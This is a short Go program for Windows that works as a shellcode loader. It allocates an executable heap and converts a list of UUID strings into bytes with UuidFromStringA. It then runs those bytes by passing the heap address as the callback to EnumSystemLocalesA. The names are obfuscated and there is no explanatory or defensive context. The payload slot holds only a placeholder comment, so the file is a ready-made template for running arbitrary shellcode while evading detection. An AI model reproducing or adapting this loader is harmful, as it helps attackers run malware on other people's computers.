package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

func AUISDGUI(UAGUIG []string) {
	UIHUIS := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")
	heapCreate := UIHUIS.NewProc("HeapCreate")
	heapAlloc := UIHUIS.NewProc("HeapAlloc")
	enumSystemLocalesA := UIHUIS.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")
	heapAddr, _, _ := heapCreate.Call(0x00040000, 0, 0)
	addr, _, _ := heapAlloc.Call(heapAddr, 0, 0x00100000)
	addrPtr := addr
	for _, uuid := range UAGUIG {
		u := append([]byte(uuid), 0)
		rpcStatus, _, _ := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
		if rpcStatus != 0 {
			fmt.Printf("ERROR!!!")
		}
		addrPtr += 16
	}
	ret, _, _ := enumSystemLocalesA.Call(addr, 0)
	if ret == 0 {
		fmt.Printf("ERROR")
	}
}

func main() {
	var UAGUIG []string
	UAGUIG = []string{
	 	//UUID-shellcode
	}
	AUISDGUI(UAGUIG)

}
